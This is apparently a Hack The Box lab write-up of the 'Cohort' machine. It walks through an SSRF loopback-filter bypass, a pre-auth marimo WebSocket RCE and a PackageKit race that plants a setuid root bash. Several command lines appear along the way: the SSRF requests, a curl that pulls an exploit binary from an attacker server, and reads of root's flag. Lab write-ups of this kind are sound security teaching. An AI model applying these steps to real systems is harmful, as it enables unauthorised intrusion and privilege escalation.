---
title: 'Cohort'
target: 'Hack The Box — Cohort'
difficulty: 'medium'
date: 2025-08-29
summary: 'An HTB machine — scanning with RustScan and nmap to find SSH (22), HTTP (80), and HTTPS (443) behind nginx redirecting to cohort.htb with a wildcard SAN for *.cohort.htb, discovering a /portal.html page with a URL validation form vulnerable to SSRF via the /api/validate endpoint, bypassing the loopback filter with 127.1 to scan internal ports, finding a marimo notebook on port 8888 proxied through a hidden vhost nb-1be3782a8afd3ad5.cohort.htb exposed via the /status endpoint, exploiting CVE-2026-39987 (marimo WebSocket pre-auth RCE) with a custom Python exploit performing raw TLS and WebSocket handshake for a shell as marimo, then escalating to root via CVE-2026-41651 — a TOCTOU race condition in PackageKit 1.2.8 that swaps a SIMULATE transaction for a real install to drop a setuid root bash binary.'
role: 'pentest'
tags: ['rustscan', 'nmap', 'ssrf', 'loopback-bypass', 'marimo', 'cve-2026-39987', 'websocket', 'python', 'packagekit', 'cve-2026-41651', 'toctou', 'dbus', 'privilege-escalation', 'setuid']
problem: 'Cohort is a medium-rated Linux machine running SSH (22), HTTP (80), and HTTPS (443) behind nginx 1.24.0 with a TLS certificate for cohort.htb and a wildcard SAN *.cohort.htb. The web application is a single-page app called Cohort Analytics with a URL validation endpoint vulnerable to SSRF. Internal services include a marimo notebook on port 8888 with a pre-authentication WebSocket RCE, and PackageKit 1.2.8 running on D-Bus vulnerable to a TOCTOU race condition for privilege escalation.'
action: 'Ran RustScan to quickly identify open ports 22, 80, and 443. Ran nmap with version detection and default scripts against these ports — 22/tcp (OpenSSH 9.6p1), 80/tcp (nginx 1.24.0 redirecting to https://cohort.htb/), 443/tcp (nginx 1.24.0, TLS cert for cohort.htb with DNS:*.cohort.htb SAN). Added cohort.htb to /etc/hosts. The main site is a SPA called Cohort Analytics with an obfuscated JS bundle. Found /portal.html (Client Insights) with a URL validation form that POSTs to /api/validate with {"url":"...","format":"csv"}. Tested SSRF — direct 127.0.0.1 blocked with "Internal or loopback addresses are not permitted", but 127.1 bypassed the filter and returned the Cohort Analytics HTML in the preview field. Used the SSRF to scan internal ports — port 5000 returned a 405 JSON API response, port 8888 returned a marimo notebook login page. Fetched the /status endpoint (403 externally but accessible via SSRF) which revealed the nginx upstream configuration including a hidden vhost nb-1be3782a8afd3ad5.cohort.htb proxying to 127.0.0.1:8888. Researched CVE-2026-39987 — a pre-authentication RCE in marimo where the /terminal/ws WebSocket endpoint is missing validate_auth(), allowing unauthenticated command execution. Wrote a custom Python exploit (marimo_exploit.py) that performs a raw TLS connection through the nginx proxy, completes the WebSocket upgrade handshake with manual frame masking, and sends commands to the terminal. Got a shell as marimo (uid=1000). Retrieved the user flag. Enumerated the system — found PackageKit 1.2.8 installed, confirmed dbus-send and dpkg-deb available, sudo requires a password. Downloaded a precompiled exploit binary (exploit.bin) from the attacker HTTP server via curl. The exploit targets CVE-2026-41651, a TOCTOU race condition in PackageKit D-Bus InstallFiles transactions — it creates two .deb packages, races a SIMULATE transaction against a real install, and the postinst script creates /tmp/.suid_bash (a setuid root copy of bash with permissions 4755). Ran the exploit successfully, confirmed /tmp/.suid_bash exists with permissions 4755 owned by root. Executed /tmp/.suid_bash -p -c "id; cat /root/root.txt" to get euid=0(root) and read the root flag.'
outcome: 'Gained root access to the machine. The attack chain was SSRF via loopback filter bypass (127.1) to discover internal services, marimo WebSocket pre-authentication RCE (CVE-2026-39987) for initial shell as marimo, and PackageKit TOCTOU race condition (CVE-2026-41651) for privilege escalation to root.'
draft: false
---

## Background

Cohort is a medium-rated Linux machine running a web application called Cohort Analytics behind nginx. The attack chain is methodical and technical — an SSRF vulnerability in the URL validation endpoint leaks the internal service topology, a pre-authentication WebSocket RCE in a marimo notebook provides the initial foothold without needing credentials, and a TOCTOU race condition in PackageKit escalates to root by abusing the D-Bus package installation interface. The box rewards careful enumeration and exploit development, particularly in understanding how WebSocket connections can bypass authentication checks that are properly enforced on HTTP routes.

---

## Enumeration

A RustScan sweep against the target quickly identifies three open ports, and nmap follows up with version detection and default scripts.

![RustScan output showing Open 10.129.67.237:22, Open 10.129.67.237:80, Open 10.129.67.237:443, followed by nmap SYN Stealth Scan completing in 0.20s discovering 3 ports, with the port table showing 22/tcp open ssh, 80/tcp open http, and 443/tcp open https all with syn-ack ttl 63.](/writeups/htb-cohort/01-rustscan.png)

![Nmap detailed scan showing 22/tcp OpenSSH 9.6p1 Ubuntu 3ubuntu13.18 with ECDSA and ED25519 host keys, 80/tcp nginx 1.24.0 with http-title Did not follow redirect to https://cohort.htb/, 443/tcp nginx 1.24.0 with TLS ALPN http/1.1 http/1.0 http/0.9, ssl-cert Subject commonName=cohort.htb organizationName=Cohort Analytics with Subject Alternative Name DNS:cohort.htb DNS:*.cohort.htb valid from 2026-06-01 to 2126-05-08, and Service Info OS Linux.](/writeups/htb-cohort/02-nmap-detailed.png)

Port 22 running OpenSSH 9.6p1, port 80 and 443 both running nginx 1.24.0. The HTTP service on port 80 redirects to `https://cohort.htb/`, and the TLS certificate reveals `cohort.htb` as the common name with a wildcard SAN entry `*.cohort.htb` — this immediately suggests there may be subdomains worth discovering. After adding `cohort.htb` to `/etc/hosts`, the main site loads as a single-page application called Cohort Analytics with an obfuscated JavaScript bundle. The main site itself doesn't offer much, but browsing further reveals `/portal.html` — a "Client Insights" page with a URL validation form.

---

## SSRF — loopback filter bypass

The portal page has a form that accepts a URL and sends it to the server for validation. The POST request goes to `/api/validate` with a JSON body containing the URL and format. The server fetches the URL server-side and returns the content in a `preview` field — a classic server-side request forgery setup. Testing with `http://127.0.0.1/` to see if internal access is possible:

![Terminal showing curl POST to https://cohort.htb/api/validate with Content-Type application/json and body url http://127.0.0.1/ format csv, response showing ok false and message Internal or loopback addresses are not permitted.](/writeups/htb-cohort/03-ssrf-blocked.png)

Direct `127.0.0.1` is blocked — the application has a filter that rejects loopback addresses. However, the filter only checks for the standard `127.0.0.1` representation. Using `127.1` — a shorthand that the OS resolves to the same loopback address but the filter doesn't recognise — bypasses the check entirely.

![Terminal showing curl POST to https://cohort.htb/api/validate with body url http://127.1/ format csv, response showing ok true, fetched_status 200, content_type text/html, and preview containing the full Cohort Analytics HTML page source with meta tags, stylesheets, and JavaScript required heading, message Source reachable.](/writeups/htb-cohort/04-ssrf-bypass.png)

The bypass works — the server fetches the content from `127.1` and returns the Cohort Analytics page HTML in the preview field. With read SSRF confirmed, the next step is scanning internal ports to see what services are running behind the firewall. Two ports return interesting results.

![Terminal showing two curl commands — first POST to /api/validate with url http://127.1:5000/ returning ok true, fetched_status 405, content_type application/json, preview showing ok false message Method not allowed, message Source responded with an error status. Second POST with url http://127.1:8888/ returning ok true, fetched_status 200, content_type text/html charset=utf-8, preview containing a marimo notebook login page HTML with Access Token or Password label, password input field, and Login button styled with background-color #1C7362.](/writeups/htb-cohort/05-internal-ports.png)

Port 5000 returns a 405 JSON API response — some kind of internal API that doesn't accept GET requests. Port 8888 is far more interesting — it returns a marimo notebook login page. Marimo is a reactive Python notebook, and having one running on an internal port suggests a development or data analysis environment.

Using the SSRF to fetch the `/status` endpoint — which returns 403 when accessed externally but is reachable from localhost — reveals the nginx upstream configuration. The response exposes a hidden virtual host: `nb-1be3782a8afd3ad5.cohort.htb` proxying to `127.0.0.1:8888`. This is the marimo notebook's external-facing hostname, routed through nginx but not advertised anywhere on the main site.

---

## CVE-2026-39987 — marimo WebSocket pre-auth RCE

CVE-2026-39987 is a pre-authentication remote code execution vulnerability in the marimo notebook application. The issue lies in the `/terminal/ws` WebSocket endpoint — while the HTTP routes properly enforce authentication through `validate_auth()`, the WebSocket upgrade handler is missing this check entirely. An attacker can connect to the terminal WebSocket without any credentials and execute arbitrary commands on the server.

Exploiting this requires a custom Python script because the connection goes through nginx's reverse proxy with TLS, and the WebSocket handshake needs manual frame masking. The exploit (`marimo_exploit.py`) performs a raw TLS connection to the nginx proxy using the `nb-1be3782a8afd3ad5.cohort.htb` virtual host, completes the HTTP 101 WebSocket upgrade, and then sends commands through masked WebSocket frames to the terminal endpoint.

```python
python3 marimo_exploit.py
```

![Terminal showing python3 marimo_exploit.py execution with Handshake response HTTP/1.1 101 Switching Protocols, Server nginx/1.24.0 Ubuntu, Connection upgrade, Upgrade websocket, Sec-WebSocket-Accept header, then a marimo shell prompt showing id; whoami; hostname output — uid=1000(marimo) gid=1000(marimo) groups=1000(marimo), whoami marimo, hostname cohort.](/writeups/htb-cohort/06-marimo-shell.png)

The exploit connects successfully and delivers a shell as `marimo` (uid=1000). Running `id` confirms the user context, and `hostname` confirms the target. The user flag is in marimo's home directory.

![Terminal showing python3 marimo_exploit.py with command cat /home/marimo/user.txt, WebSocket handshake completing with HTTP/1.1 101 Switching Protocols, and the shell executing cat /home/marimo/user.txt with the flag value redacted.](/writeups/htb-cohort/07-user-flag.png)

The user flag was retrieved.

---

## Privilege escalation — CVE-2026-41651

With a shell as marimo, enumerating the system for privilege escalation vectors. Checking for installed packages and available tools reveals PackageKit 1.2.8 on the system, along with `dpkg-deb` and `dbus-send`.

![Terminal showing two commands run through marimo_exploit.py — first dpkg -l pipe grep -i packagekit; which dpkg-deb; dbus-send --version listing four PackageKit packages (gir1.2-packagekit-glib-1.0, libpackagekit-glib2-18:amd64, packagekit, packagekit-tools) all version 1.2.8-2ubuntu1.2 with dbus-send usage info. Second command sudo -l 2>&1; id; cat /etc/os-release; uname -a showing sudo password required for marimo.](/writeups/htb-cohort/08-packagekit-enum.png)

PackageKit 1.2.8 is installed and `sudo` requires a password that isn't known. The privilege escalation path here is CVE-2026-41651 — a TOCTOU (time-of-check-time-of-use) race condition in PackageKit's D-Bus `InstallFiles` interface. The vulnerability works by exploiting the gap between PackageKit's SIMULATE transaction (which validates the package) and the actual installation. An attacker creates two `.deb` packages — one benign package that passes the simulation check, and one malicious package with a `postinst` script that executes arbitrary commands as root. By racing the swap between the SIMULATE and REAL install phases, the malicious package gets installed with root privileges.

Downloading the precompiled exploit binary from the attacker's HTTP server:

![Terminal showing marimo_exploit.py running curl -s -o /tmp/exploit.bin from http://10.10.14.140:8000/exploit.bin followed by chmod +x and ls -la showing the exploit binary at 17280 bytes with execute permissions owned by marimo.](/writeups/htb-cohort/09-exploit-download.png)

The exploit binary is downloaded to `/tmp/exploit.bin` and made executable. Running it triggers the TOCTOU race against PackageKit's D-Bus interface.

![Terminal showing marimo_exploit.py executing cat /tmp/pk.log and stat /tmp/.suid_bash — the log shows CVE-2026-41651 PackageKit LPE Refined, TxID /2_aedeaeee, Racing SIMULATE to REAL, Polling for /tmp/.suid_bash 60s, then stat output showing /tmp/.suid_bash as a regular file with Access permissions 4755 rwsr-xr-x, Uid 0 root, Gid 0 root, size 1446024 bytes.](/writeups/htb-cohort/10-packagekit-exploit.png)

The exploit successfully races the SIMULATE and REAL transactions, and the malicious `postinst` script creates `/tmp/.suid_bash` — a copy of bash with setuid root permissions (4755). The `stat` output confirms the binary is owned by root with the SUID bit set.

![Terminal showing marimo_exploit.py executing /tmp/.suid_bash -p -c id; cat /root/root.txt with output uid=1000(marimo) gid=1000(marimo) euid=0(root) groups=1000(marimo) confirming effective root, followed by the root flag value redacted.](/writeups/htb-cohort/11-root-flag.png)

Running `/tmp/.suid_bash -p -c 'id; cat /root/root.txt'` confirms `euid=0(root)` — effective root through the setuid binary. The root flag was retrieved.

---

## What I took from this

The SSRF on Cohort is a good example of why loopback filters need to be comprehensive. Blocking `127.0.0.1` is necessary but not sufficient — `127.1`, `127.0.1`, `0x7f000001`, `2130706433` (decimal), and `0177.0.0.1` (octal) all resolve to the same loopback address on most operating systems. A robust SSRF filter needs to resolve the hostname first and check the resulting IP address against the full range of loopback and internal addresses (`127.0.0.0/8`, `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, `169.254.0.0/16`, `::1`, `fc00::/7`), not just pattern-match against string representations. The SSRF here also leaked the nginx upstream configuration through the `/status` endpoint, which is a reminder that internal status pages should be restricted even from localhost if the application has SSRF potential.

The marimo WebSocket vulnerability (CVE-2026-39987) highlights a pattern that appears frequently in web applications — HTTP routes are properly authenticated, but WebSocket endpoints are treated differently during development and miss the same authentication middleware. The `/terminal/ws` endpoint gives direct shell access to the server, and the only thing standing between an attacker and that shell was a `validate_auth()` call that was never added. This is particularly dangerous with notebook applications because the terminal endpoint is designed to execute arbitrary code — there's no additional sandbox or restriction once you're connected.

The PackageKit TOCTOU race (CVE-2026-41651) is a sophisticated local privilege escalation that exploits the gap between validation and execution in the D-Bus package installation flow. PackageKit runs as root and trusts that the package it validated during SIMULATE is the same one it installs during the real transaction. By swapping the package between these two phases, the attacker gets a malicious `postinst` script executed as root. The fix requires atomic validation-and-install or re-validation before execution. The exploit creating a setuid copy of bash is the cleanest privilege escalation pattern — it persists across the exploit's lifetime and gives root access through a simple `-p` flag without needing to maintain a reverse shell or repeat the race.
